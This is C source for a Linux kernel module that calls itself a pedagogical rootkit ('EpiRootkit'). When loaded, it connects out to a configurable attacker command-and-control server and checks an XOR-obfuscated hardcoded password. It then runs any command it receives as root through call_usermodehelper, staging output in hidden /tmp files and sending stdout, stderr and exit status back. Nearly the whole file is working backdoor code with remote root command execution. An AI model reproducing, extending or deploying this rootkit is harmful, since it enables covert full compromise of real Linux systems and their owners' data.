#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

#define XOR_KEY 0x2A
#define PASSWORD "secret"
#define PASSWORD_LEN 6
#define MAX_CMD_LEN 512
#define EOF_MARKER "--EOF--"
#define SEP_STDERR "--STDERR--"
#define SEP_STATUS "--STATUS--"

static struct socket *g_sock = NULL;
static struct task_struct *g_conn_thread = NULL;
static int connection_state = 0;

static char *server_ip = "192.168.15.6";
static int server_port = 4242;
module_param(server_ip, charp, 0400);
module_param(server_port, int, 0400);
MODULE_PARM_DESC(server_ip, "Attacker server IP address");
MODULE_PARM_DESC(server_port, "Attacker server port");

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static void xor_encrypt(char *buf, size_t len) {
    for (size_t i = 0; i < len; ++i)
        buf[i] ^= XOR_KEY;
}

static int recv_data(char *buf, size_t len) {
    struct kvec iov = {.iov_base = buf, .iov_len = len};
    struct msghdr msg = {0};
    return kernel_recvmsg(g_sock, &msg, &iov, 1, len, 0);
}

static int send_data(const char *buf, size_t len) {
    struct kvec iov = {.iov_base = (char *)buf, .iov_len = len};
    struct msghdr msg = {0};
    return kernel_sendmsg(g_sock, &msg, &iov, 1, len);
}

static void send_encrypted_section(const char *data) {
    size_t len = strlen(data);
    char *tmp = kmalloc(len + 1, GFP_KERNEL);
    if (!tmp) return;
    memcpy(tmp, data, len);
    xor_encrypt(tmp, len);
    send_data(tmp, len);
    kfree(tmp);
}

static int execute_and_stream_output(const char *cmd) {
    char tmp_stdout[] = "/tmp/.rk_stdout";
    char tmp_stderr[] = "/tmp/.rk_stderr";
    char tmp_status[] = "/tmp/.rk_status";

    // Ensure temp files are accessible
    char setup_cmd[1024];
    snprintf(setup_cmd, sizeof(setup_cmd), "touch %s %s %s && chmod 666 %s %s %s",
             tmp_stdout, tmp_stderr, tmp_status, tmp_stdout, tmp_stderr, tmp_status);

    char *setup_argv[] = {"/bin/sh", "-c", setup_cmd, NULL};
    mm_segment_t old_fs = get_fs();
    set_fs(KERNEL_DS);
    int setup_ret = call_usermodehelper(setup_argv[0], setup_argv, NULL, UMH_WAIT_PROC);
    set_fs(old_fs);

    printk(KERN_INFO "epirootkit: Setup temp files result: %d\n", setup_ret);

    // Construct command with env vars to help with execution
    char full_cmd[1024];
    snprintf(full_cmd, sizeof(full_cmd),
             "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin %s > %s 2> %s; echo $? > %s",
             cmd, tmp_stdout, tmp_stderr, tmp_status);

    printk(KERN_INFO "epirootkit: Executing command: %s\n", full_cmd);

    // Use different approach for command execution
    char *argv[] = {"/bin/bash", "-c", full_cmd, NULL};
    char *envp[] = {
        "HOME=/",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    set_fs(old_fs);

    printk(KERN_INFO "epirootkit: Command execution result: %d\n", ret);

    if (ret != 0) {
        printk(KERN_WARNING "epirootkit: Command execution failed: %d\n", ret);
        // Try direct execution with sh instead of bash
        char *sh_argv[] = {"/bin/sh", "-c", full_cmd, NULL};
        old_fs = get_fs();
        set_fs(KERNEL_DS);
        ret = call_usermodehelper(sh_argv[0], sh_argv, envp, UMH_WAIT_PROC);
        set_fs(old_fs);
        printk(KERN_INFO "epirootkit: Fallback command execution result: %d\n", ret);

        if (ret != 0) {
            send_encrypted_section("Command execution failed");
            send_encrypted_section(SEP_STDERR);
            send_encrypted_section("Error executing command");
            send_encrypted_section(SEP_STATUS);
            send_encrypted_section("-1");
            send_encrypted_section(EOF_MARKER);
            return ret;
        }
    }

    // Output a simple test string directly to stdout file for debugging
    char *debug_argv[] = {"/bin/sh", "-c", "echo 'DEBUG OUTPUT' > /tmp/.rk_stdout", NULL};
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    call_usermodehelper(debug_argv[0], debug_argv, NULL, UMH_WAIT_PROC);
    set_fs(old_fs);

    // Check if files exist
    struct file *f_stdout, *f_stderr, *f_status;
    f_stdout = filp_open(tmp_stdout, O_RDONLY, 0);
    f_stderr = filp_open(tmp_stderr, O_RDONLY, 0);
    f_status = filp_open(tmp_status, O_RDONLY, 0);

    printk(KERN_INFO "epirootkit: File check - stdout: %ld, stderr: %ld, status: %ld\n",
           IS_ERR(f_stdout) ? PTR_ERR(f_stdout) : 0,
           IS_ERR(f_stderr) ? PTR_ERR(f_stderr) : 0,
           IS_ERR(f_status) ? PTR_ERR(f_status) : 0);

    if (!IS_ERR(f_stdout)) filp_close(f_stdout, NULL);
    if (!IS_ERR(f_stderr)) filp_close(f_stderr, NULL);
    if (!IS_ERR(f_status)) filp_close(f_status, NULL);

    // Use kernel_read directly instead of vfs_read for compatibility
    struct file *f;
    loff_t pos;
    char buf[256];
    int bytes_read;

    // Try kernel_read for stdout
    f = filp_open(tmp_stdout, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        printk(KERN_INFO "epirootkit: Reading stdout file\n");
        pos = 0;
        memset(buf, 0, sizeof(buf));
        bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
        printk(KERN_INFO "epirootkit: kernel_read result: %d bytes\n", bytes_read);
        if (bytes_read > 0) {
            buf[bytes_read] = '\0';
            send_encrypted_section(buf);
            pos += bytes_read;

            // Read more if needed
            while (bytes_read > 0) {
                memset(buf, 0, sizeof(buf));
                bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
                if (bytes_read <= 0) break;
                buf[bytes_read] = '\0';
                send_encrypted_section(buf);
                pos += bytes_read;
            }
        } else {
            send_encrypted_section("No output"); // Indicate empty output
        }
        filp_close(f, NULL);
    } else {
        printk(KERN_WARNING "epirootkit: Failed to open stdout file: %ld\n", PTR_ERR(f));
        send_encrypted_section("Error: Cannot access output file");
    }

    // Send stderr marker
    send_encrypted_section(SEP_STDERR);

    // Read stderr
    f = filp_open(tmp_stderr, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        printk(KERN_INFO "epirootkit: Reading stderr file\n");
        pos = 0;
        memset(buf, 0, sizeof(buf));
        bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
        if (bytes_read > 0) {
            buf[bytes_read] = '\0';
            send_encrypted_section(buf);
            pos += bytes_read;

            // Read more if needed
            while (bytes_read > 0) {
                memset(buf, 0, sizeof(buf));
                bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
                if (bytes_read <= 0) break;
                buf[bytes_read] = '\0';
                send_encrypted_section(buf);
                pos += bytes_read;
            }
        }
        filp_close(f, NULL);
    }

    // Send status marker
    send_encrypted_section(SEP_STATUS);

    // Read status
    f = filp_open(tmp_status, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        printk(KERN_INFO "epirootkit: Reading status file\n");
        pos = 0;
        memset(buf, 0, sizeof(buf));
        bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
        printk(KERN_INFO "epirootkit: Status file read: %d bytes, content: %s\n", bytes_read, buf);
        if (bytes_read > 0) {
            buf[bytes_read] = '\0';
            buf[strcspn(buf, "\n")] = 0;
            send_encrypted_section(buf);
        } else {
            send_encrypted_section("0"); // Default to success if empty
        }
        filp_close(f, NULL);
    } else {
        printk(KERN_WARNING "epirootkit: Failed to open status file: %ld\n", PTR_ERR(f));
        send_encrypted_section("0"); // Default to success
    }

    // Clean up temp files
    printk(KERN_INFO "epirootkit: Cleaning up temp files\n");
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    call_usermodehelper("/bin/rm", (char *[]){"/bin/rm", "-f", tmp_stdout, tmp_stderr, tmp_status, NULL}, NULL, UMH_WAIT_PROC);
    set_fs(old_fs);

    // Send EOF marker
    send_encrypted_section(EOF_MARKER);
    printk(KERN_INFO "epirootkit: Command completed\n");
    return 0;
}

static int rootkit_thread_fn(void *data) {
    struct sockaddr_in server;

    while (!kthread_should_stop()) {
        if (sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock) < 0) {
            ssleep(5);
            continue;
        }

        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);
        server.sin_addr.s_addr = in_aton(server_ip);

        if (g_sock->ops->connect(g_sock, (struct sockaddr *)&server, sizeof(server), 0) < 0) {
            sock_release(g_sock);
            g_sock = NULL;
            ssleep(5);
            continue;
        }

        notify_connection_state(1);

        char auth_buf[PASSWORD_LEN];
        if (recv_data(auth_buf, PASSWORD_LEN) != PASSWORD_LEN) {
            printk(KERN_WARNING "epirootkit: auth receive error\n");
            break;
        }

        xor_encrypt(auth_buf, PASSWORD_LEN);

        if (strncmp(auth_buf, PASSWORD, PASSWORD_LEN) != 0) {
            char fail[] = "FAIL";
            xor_encrypt(fail, sizeof(fail) - 1);
            send_data(fail, sizeof(fail) - 1);
            break;
        }

        char ok[] = "OK";
        xor_encrypt(ok, sizeof(ok) - 1);
        send_data(ok, sizeof(ok) - 1);

        char cmd_buf[MAX_CMD_LEN];
        while (!kthread_should_stop()) {
            memset(cmd_buf, 0, sizeof(cmd_buf));
            int len = recv_data(cmd_buf, MAX_CMD_LEN);
            if (len <= 0) break;

            xor_encrypt(cmd_buf, len);
            cmd_buf[len] = '\0';

            if (strcmp(cmd_buf, "exit") == 0 || strcmp(cmd_buf, "quit") == 0) break;
            if (strcmp(cmd_buf, "PING") == 0) {
                char pong[] = "PONG";
                xor_encrypt(pong, sizeof(pong) - 1);
                send_data(pong, sizeof(pong) - 1);
                continue;
            }
            if (strncmp(cmd_buf, "hide ", 5) == 0) {
                send_encrypted_section("[TODO] hide command acknowledged\n");
                send_encrypted_section(SEP_STDERR);
                send_encrypted_section(SEP_STATUS);
                send_encrypted_section("0");
                send_encrypted_section(EOF_MARKER);
                continue;
            }
            execute_and_stream_output(cmd_buf);
        }

        break;
    }

    if (g_sock) {
        kernel_sock_shutdown(g_sock, SHUT_RDWR);
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }

    return 0;
}

static int __init epirootkit_init(void) {
    pr_info("epirootkit: Initializing...\n");
    g_conn_thread = kthread_run(rootkit_thread_fn, NULL, "rk_conn");
    if (IS_ERR(g_conn_thread)) {
        pr_err("epirootkit: Failed to start connection thread\n");
        return PTR_ERR(g_conn_thread);
    }
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("epirootkit: Cleaning up module...\n");
    if (g_conn_thread) {
        kthread_stop(g_conn_thread);
        g_conn_thread = NULL;
    }
    if (g_sock) {
        kernel_sock_shutdown(g_sock, SHUT_RDWR);
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }
    pr_info("epirootkit: Cleanup complete\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
